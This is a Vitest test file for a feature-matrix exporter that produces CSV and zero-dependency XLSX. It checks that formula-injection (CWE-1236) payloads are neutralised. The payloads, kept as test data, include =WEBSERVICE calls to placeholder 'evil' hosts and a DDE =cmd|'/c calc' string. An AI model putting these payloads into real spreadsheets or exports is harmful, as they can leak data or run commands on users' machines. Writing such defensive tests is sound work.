// SPDX-License-Identifier: Apache-2.0
import { describe, it, expect } from 'vitest'
import {
  featureMatrixToCsv,
  featureMatrixToXlsx,
  parseFeatureMatrixRows,
  type FeatureMatrixRow,
} from '../../src/export/feature-matrix-export.js'

function row(overrides: Partial<FeatureMatrixRow>): FeatureMatrixRow {
  return {
    featureId: 'REQ-001',
    capability: 'cap',
    kitDims: [],
    level: 'L2',
    status: 'Done',
    codeRef: '',
    testRef: '',
    docRef: '',
    issueRef: '',
    note: '',
    ...overrides,
  }
}

const SAMPLE_MARKDOWN = `# FEATURE_MATRIX

<!-- FEATURE_MATRIX_START -->
| feature_id | capability | kit_dims | level | status | code_ref | test_ref | doc_ref | issue_ref | note |
|---|---|---|---|---|---|---|---|---|---|
| REQ-001 | Architecture enforcement | N01,N02 | L2 | Done | src/generators/boundaries.ts | __tests__/generators/boundaries.test.ts | docs/PRODUCT/FEATURE_MATRIX.md | | |
| REQ-002 | Static analysis | N13 | L2 | Partial | src/generators/quality.ts | | | #500 | Linting only |
| REQ-003 | Audit trail | N08,N73 | L4 | Missing | | | | #501 | |
<!-- FEATURE_MATRIX_END -->

## Summary

| Status | Count |
|---|---|
| Verified | 0 |
| Done | 1 |
| Partial | 1 |
| Missing | 1 |
| **Total** | **3** |
`

describe('parseFeatureMatrixRows', () => {
  it('parses rows from sentinel block', () => {
    const rows = parseFeatureMatrixRows(SAMPLE_MARKDOWN)
    expect(rows).toHaveLength(3)
  })

  it('parses feature_id correctly', () => {
    const rows = parseFeatureMatrixRows(SAMPLE_MARKDOWN)
    expect(rows[0]?.featureId).toBe('REQ-001')
    expect(rows[1]?.featureId).toBe('REQ-002')
  })

  it('parses status correctly', () => {
    const rows = parseFeatureMatrixRows(SAMPLE_MARKDOWN)
    expect(rows[0]?.status).toBe('Done')
    expect(rows[1]?.status).toBe('Partial')
    expect(rows[2]?.status).toBe('Missing')
  })

  it('parses kit_dims as array', () => {
    const rows = parseFeatureMatrixRows(SAMPLE_MARKDOWN)
    expect(rows[0]?.kitDims).toEqual(['N01', 'N02'])
  })

  it('returns empty array when no sentinel markers found', () => {
    const rows = parseFeatureMatrixRows('# No markers here\n\nSome content.')
    expect(rows).toHaveLength(0)
  })
})

describe('featureMatrixToCsv', () => {
  it('produces non-empty output', () => {
    const rows = parseFeatureMatrixRows(SAMPLE_MARKDOWN)
    const csv = featureMatrixToCsv(rows)
    expect(csv.length).toBeGreaterThan(0)
  })

  it('has a header row', () => {
    const rows = parseFeatureMatrixRows(SAMPLE_MARKDOWN)
    const csv = featureMatrixToCsv(rows)
    const firstLine = csv.split('\n')[0] ?? ''
    expect(firstLine).toContain('feature_id')
    expect(firstLine).toContain('status')
    expect(firstLine).toContain('kit_dims')
  })

  it('includes all data rows', () => {
    const rows = parseFeatureMatrixRows(SAMPLE_MARKDOWN)
    const csv = featureMatrixToCsv(rows)
    expect(csv).toContain('REQ-001')
    expect(csv).toContain('REQ-002')
    expect(csv).toContain('REQ-003')
  })

  it('RFC-4180: wraps cells with commas in double quotes', () => {
    const rows = parseFeatureMatrixRows(SAMPLE_MARKDOWN)
    const csv = featureMatrixToCsv(rows)
    // N01,N02 contains a comma — should be quoted
    expect(csv).toContain('"N01,N02"')
  })

  // CWE-1236: cells beginning with a formula trigger must be neutralized so a
  // spreadsheet renders them as text, not as an evaluated formula.
  it('CWE-1236: neutralizes a =WEBSERVICE() note with a leading quote', () => {
    const csv = featureMatrixToCsv([row({ note: '=WEBSERVICE("http://evil.example/x")' })])
    // The dangerous cell contains a comma+quote, so it is RFC-4180 quoted; the
    // payload inside must start with the neutralizing single quote, not '='.
    expect(csv).toContain('"\'=WEBSERVICE')
    expect(csv).not.toMatch(/,=WEBSERVICE/)
  })

  it.each([
    ['=', "=cmd|'/c calc'!A0"],
    ['+', '+1+1'],
    ['-', '-2+3'],
    ['@', '@SUM(A1:A9)'],
    ['TAB', '\tWEBSERVICE'],
    ['CR', '\rmalicious'],
  ])('CWE-1236: neutralizes a leading %s trigger in issueRef', (_label, payload) => {
    const csv = featureMatrixToCsv([row({ issueRef: payload })])
    // Every data cell after the header must carry the neutralizing prefix.
    const dataLine = csv.split('\r\n')[1] ?? ''
    expect(dataLine).toContain(`'${payload.replace(/"/g, '""')}`)
  })

  it('CWE-1236: leaves a benign issueRef untouched', () => {
    const csv = featureMatrixToCsv([row({ issueRef: '#500' })])
    expect(csv).not.toContain("'#500")
    expect(csv).toContain('#500')
  })
})

describe('featureMatrixToXlsx — native zero-dep xlsx (STORE zip + inline-string OOXML)', () => {
  // STORE-only zip local-file-header walker (no central-directory parse needed).
  // Layout: PK\x03\x04 | ver(2) flag(2) method(2) time(2) date(2) crc(4) csize(4)
  //         usize(4) nameLen(2) extraLen(2) | name | extra | data(usize).
  function extractZipEntries(buf: Buffer): Map<string, Buffer> {
    const entries = new Map<string, Buffer>()
    let off = 0
    while (off + 30 <= buf.length && buf.readUInt32LE(off) === 0x04034b50) {
      const method = buf.readUInt16LE(off + 8)
      const usize = buf.readUInt32LE(off + 22)
      const nameLen = buf.readUInt16LE(off + 26)
      const extraLen = buf.readUInt16LE(off + 28)
      const name = buf.subarray(off + 30, off + 30 + nameLen).toString('utf8')
      const dataStart = off + 30 + nameLen + extraLen
      const size = method === 0 ? usize : buf.readUInt32LE(off + 18) // STORE: usize==csize
      entries.set(name, buf.subarray(dataStart, dataStart + size))
      off = dataStart + size
    }
    return entries
  }

  const sheetXml = (buf: Buffer): string =>
    extractZipEntries(buf).get('xl/worksheets/sheet1.xml')?.toString('utf8') ?? ''

  it('emits a ZIP container (PK\\x03\\04 magic) with an EOCD record', async () => {
    const buf = await featureMatrixToXlsx([row({})])
    expect(buf.subarray(0, 4)).toEqual(Buffer.from([0x50, 0x4b, 0x03, 0x04]))
    // End-of-central-directory signature somewhere in the buffer.
    expect(buf.subarray(0, 200).toString('latin1')).not.toContain('\x50\x4b\x05\x06')
    expect(buf.toString('latin1')).toContain('\x50\x4b\x05\x06')
  })

  it('contains the required OOXML parts', async () => {
    const entries = extractZipEntries(await featureMatrixToXlsx([row({})]))
    expect(entries.has('[Content_Types].xml')).toBe(true)
    expect(entries.has('_rels/.rels')).toBe(true)
    expect(entries.has('xl/workbook.xml')).toBe(true)
    expect(entries.has('xl/_rels/workbook.xml.rels')).toBe(true)
    expect(entries.has('xl/worksheets/sheet1.xml')).toBe(true)
    expect(entries.has('xl/styles.xml')).toBe(true)
  })

  it('declares Content-Type overrides for workbook/worksheet/styles (paired, not swapped)', async () => {
    const ct =
      extractZipEntries(await featureMatrixToXlsx([row({})]))
        .get('[Content_Types].xml')
        ?.toString('utf8') ?? ''
    // Each Override must pair its PartName with the correct ContentType — a swapped-type
    // workbook (workbook.xml→worksheet+xml) would pass free-floating `toContain` checks but
    // be rejected by Excel. Assert each <Override/> as a unit.
    expect(ct).toMatch(
      /<Override PartName="\/xl\/workbook\.xml" ContentType="application\/vnd\.openxmlformats-officedocument\.spreadsheetml\.sheet\.main\+xml"\/>/,
    )
    expect(ct).toMatch(
      /<Override PartName="\/xl\/worksheets\/sheet1\.xml" ContentType="application\/vnd\.openxmlformats-officedocument\.spreadsheetml\.worksheet\+xml"\/>/,
    )
    expect(ct).toMatch(
      /<Override PartName="\/xl\/styles\.xml" ContentType="application\/vnd\.openxmlformats-officedocument\.spreadsheetml\.styles\+xml"\/>/,
    )
  })

  it('wires workbook.xml <sheet r:id> → rels → sheet1 end-to-end', async () => {
    const entries = extractZipEntries(await featureMatrixToXlsx([row({})]))
    const wb = entries.get('xl/workbook.xml')?.toString('utf8') ?? ''
    const rels = entries.get('xl/_rels/workbook.xml.rels')?.toString('utf8') ?? ''
    // The workbook's sheet references rId1, and rId1 in the rels must target the worksheet.
    expect(wb).toMatch(/<sheet[^>]*r:id="rId1"/)
    expect(rels).toMatch(
      /Id="rId1"[^>]*Type="[^"]*\/worksheet"[^>]*Target="worksheets\/sheet1\.xml"/,
    )
    expect(rels).toMatch(/Id="rId2"[^>]*Type="[^"]*\/styles"[^>]*Target="styles\.xml"/)
  })

  it('styles.xml defines a bold cellXf at index 1 (header parity, index order verified)', async () => {
    const styles =
      extractZipEntries(await featureMatrixToXlsx([row({})]))
        .get('xl/styles.xml')
        ?.toString('utf8') ?? ''
    // A bold <font> exists at font index 1.
    expect(styles).toMatch(/<font><b\/>/)
    // cellXfs must have exactly 2 entries in order: index 0 = default (fontId 0),
    // index 1 = bold (fontId 1, applyFont 1). A writer that puts the bold xf first (index 0)
    // would make `s="1"` resolve to the non-bold style — assert the ORDER, not just existence.
    expect(styles).toMatch(
      /<cellXfs count="2">\s*<xf[^>]*fontId="0"[^>]*>\s*<xf[^>]*fontId="1"[^>]*applyFont="1"/,
    )
  })

  it('emits a <dimension> and <cols> with the 10 column widths', async () => {
    const xml = sheetXml(await featureMatrixToXlsx([row({})]))
    expect(xml).toMatch(/<dimension ref="A1:J2"\s*\/>/)
    expect(xml).toContain('<cols>')
    expect(xml).toMatch(/<col min="1" max="1" width="12"/)
    expect(xml).toMatch(/<col min="2" max="2" width="40"/)
    expect(xml).toMatch(/<col min="10" max="10" width="50"/)
  })

  it('every emitted cell is t="inlineStr" (the real CWE-1236 protection)', async () => {
    const xml = sheetXml(await featureMatrixToXlsx([row({ note: 'hi' })]))
    // Every <c> in the sheet must be typed inlineStr — structurally text, never a formula.
    const cellMatches = xml.match(/<c\b[^>]*>/g) ?? []
    expect(cellMatches.length).toBeGreaterThan(0)
    for (const c of cellMatches) {
      expect(c).toContain('t="inlineStr"')
    }
  })

  it('emits all 10 header <t> cells with xml:space="preserve"', async () => {
    const xml = sheetXml(await featureMatrixToXlsx([row({})]))
    for (const h of [
      'feature_id',
      'capability',
      'kit_dims',
      'level',
      'status',
      'code_ref',
      'test_ref',
      'doc_ref',
      'issue_ref',
      'note',
    ]) {
      expect(xml).toContain(`<t xml:space="preserve">${h}</t>`)
    }
  })

  it('CWE-1236: neutralizes a =WEBSERVICE() note (J2) with a leading quote (literal " preserved)', async () => {
    // `"` is intentionally literal in XML text content — xmlEscape must NOT escape it
    // (it is only special inside attribute values; the only attribute here is r="...", which
    // is alphanumeric). This assertion is a contract, not an accident. Address-bound to J2
    // (note is the 10th column) so a column-swap bug cannot false-pass.
    const xml = sheetXml(await featureMatrixToXlsx([row({ note: '=WEBSERVICE("http://evil/x")' })]))
    expect(xml).toMatch(
      /<c r="J2" t="inlineStr">[\s\S]*?<t xml:space="preserve">'=WEBSERVICE\("http:\/\/evil\/x"\)<\/t>/,
    )
  })

  it('CWE-1236: leaves a benign capability cell (B2) untouched', async () => {
    // Address-bound to B2 (capability is the 2nd column) so a column-swap bug cannot false-pass.
    const xml = sheetXml(await featureMatrixToXlsx([row({ capability: 'Static analysis' })]))
    expect(xml).toMatch(
      /<c r="B2" t="inlineStr">[\s\S]*?<t xml:space="preserve">Static analysis<\/t>/,
    )
  })

  it('emits an empty kitDims cell (not omitted) — preserves exceljs "" parity', async () => {
    const xml = sheetXml(await featureMatrixToXlsx([row({ kitDims: [] })]))
    // Column C (kit_dims) must be present as an empty inline string, not omitted.
    expect(xml).toMatch(
      /<c r="C2" t="inlineStr"[^>]*>\s*<is>\s*<t xml:space="preserve">\s*<\/t>\s*<\/is>\s*<\/c>/,
    )
  })

  it('emits every cell even for a row with only note populated (no sparse-row drift)', async () => {
    const xml = sheetXml(
      await featureMatrixToXlsx([
        row({
          featureId: '',
          capability: '',
          kitDims: [],
          level: '',
          status: '',
          codeRef: '',
          testRef: '',
          docRef: '',
          issueRef: '',
          note: 'only J',
        }),
      ]),
    )
    // All 10 cells present in row 2; the note column carries the value, the rest are empty.
    const row2 = xml.match(/<row r="2">[\s\S]*?<\/row>/)?.[0] ?? ''
    expect((row2.match(/<c\b/g) ?? []).length).toBe(10)
    expect(row2).toContain(`<t xml:space="preserve">only J</t>`)
    expect(row2).toContain('<c r="A2"')
    expect(row2).toContain('<c r="J2"')
  })

  it('empty input produces a valid header-only sheet (dimension A1:J1)', async () => {
    const buf = await featureMatrixToXlsx([])
    const xml = sheetXml(buf)
    expect(xml).toMatch(/<dimension ref="A1:J1"\s*\/>/)
    // Exactly one row (the header), 10 cells.
    expect((xml.match(/<row r="1">/) ?? []).length).toBe(1)
    expect((xml.match(/<row r="2"/) ?? []).length).toBe(0)
    const headerRow = xml.match(/<row r="1">[\s\S]*?<\/row>/)?.[0] ?? ''
    expect((headerRow.match(/<c\b/g) ?? []).length).toBe(10)
  })
})
